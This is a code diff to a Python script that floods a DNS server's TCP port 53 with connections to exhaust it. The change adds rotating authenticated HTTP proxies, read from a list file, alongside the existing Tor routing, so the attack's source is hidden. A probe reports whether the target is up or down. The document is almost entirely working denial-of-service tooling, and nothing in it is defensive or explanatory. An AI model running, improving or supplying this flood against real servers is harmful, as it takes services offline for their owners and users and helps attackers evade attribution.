@@ -9,7 +9,7 @@ Usage:
   python3 dns_tcp_flood.py --workers 500
 """
 
-import socket, struct, threading, time, random, argparse
+import socket, struct, threading, time, random, argparse, itertools
 from datetime import datetime
 
 try:
@@ -17,6 +17,27 @@ try:
     PYSOCKS_OK = True
 except ImportError:
     PYSOCKS_OK = False
+
+_proxy_cycle = None
+_proxy_lock  = threading.Lock()
+
+
+def load_proxies(path):
+    proxies = []
+    with open(path) as f:
+        for line in f:
+            line = line.strip()
+            if not line:
+                continue
+            parts = line.split(":")
+            if len(parts) == 4:
+                proxies.append((parts[0], int(parts[1]), parts[2], parts[3]))
+    return proxies
+
+
+def _next_proxy():
+    with _proxy_lock:
+        return next(_proxy_cycle)
 
 G = "\033[0;32m"; R = "\033[0;31m"; Y = "\033[0;33m"
 B = "\033[1m"; W = "\033[0m"
@@ -43,23 +64,27 @@ errors     = 0
 stop       = threading.Event()
 
 
-def _make_socket(use_tor):
+def _make_socket(use_tor, use_proxy):
+    if not PYSOCKS_OK and (use_tor or use_proxy):
+        raise RuntimeError("pip3 install pysocks")
     if use_tor:
-        if not PYSOCKS_OK:
-            raise RuntimeError("pip3 install pysocks")
         s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
         s.set_proxy(pysocks.SOCKS5, "127.0.0.1", 9050)
+    elif use_proxy:
+        ip, port_p, user, pwd = _next_proxy()
+        s = pysocks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
+        s.set_proxy(pysocks.HTTP, ip, port_p, username=user, password=pwd)
     else:
         s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     return s
 
 
-def flood_worker(target, port, use_tor):
+def flood_worker(target, port, use_tor, use_proxy):
     global sent, errors
     pkt = build_query(FLOOD_DOMAIN, FLOOD_QTYPE)
     while not stop.is_set():
         try:
-            s = _make_socket(use_tor)
+            s = _make_socket(use_tor, use_proxy)
             s.settimeout(10)
             s.connect((target, port))
             s.sendall(pkt)
@@ -72,11 +97,11 @@ def flood_worker(target, port, use_tor):
                 errors += 1
 
 
-def probe(target, port, use_tor, timeout=3.0):
+def probe(target, port, use_tor, use_proxy, timeout=3.0):
     pkt = build_query("metoo-shatkin.com", 1)
     t0 = time.time()
     try:
-        s = _make_socket(use_tor)
+        s = _make_socket(use_tor, use_proxy)
         s.settimeout(timeout)
         s.connect((target, port))
         s.sendall(pkt)
@@ -98,9 +123,22 @@ def main():
     p.add_argument("--check-interval", type=float, default=5.0)
     p.add_argument("--tor",            action="store_true",
                    help="Route via Tor SOCKS5 (127.0.0.1:9050)")
+    p.add_argument("--proxy-file",     default=None,
+                   help="ip:port:user:pass proxy list (HTTP CONNECT)")
     args = p.parse_args()
 
-    proxy_label = "Tor SOCKS5" if args.tor else "direct"
+    global _proxy_cycle
+    use_proxy = False
+    if args.proxy_file:
+        proxies = load_proxies(args.proxy_file)
+        if not proxies:
+            print(f"  {R}[ERROR]{W} No proxies loaded from {args.proxy_file}")
+            return
+        _proxy_cycle = itertools.cycle(proxies)
+        use_proxy = True
+        print(f"  {G}[PROXY]{W} {len(proxies)} proxies loaded")
+
+    proxy_label = "Tor SOCKS5" if args.tor else (args.proxy_file + " (HTTP CONNECT rotating)" if use_proxy else "direct")
     print(f"""
 {B}{'='*62}{W}
   DNS TCP Flood — port 53 TCP connection exhaustion
@@ -116,7 +154,7 @@ def main():
     for _ in range(args.workers):
         threading.Thread(
             target=flood_worker,
-            args=(args.target, args.port, args.tor),
+            args=(args.target, args.port, args.tor, use_proxy),
             daemon=True
         ).start()
 
@@ -131,7 +169,7 @@ def main():
             rps = (cur_sent - prev_sent) / args.check_interval
             prev_sent = cur_sent
 
-            ok, ms = probe(args.target, args.port, args.tor)
+            ok, ms = probe(args.target, args.port, args.tor, use_proxy)
             ts = datetime.now().strftime("%H:%M:%S")
 
             probe_str = f"{G}UP {ms:.0f}ms{W}" if ok else f"{R}DOWN {ms:.0f}ms{W}"
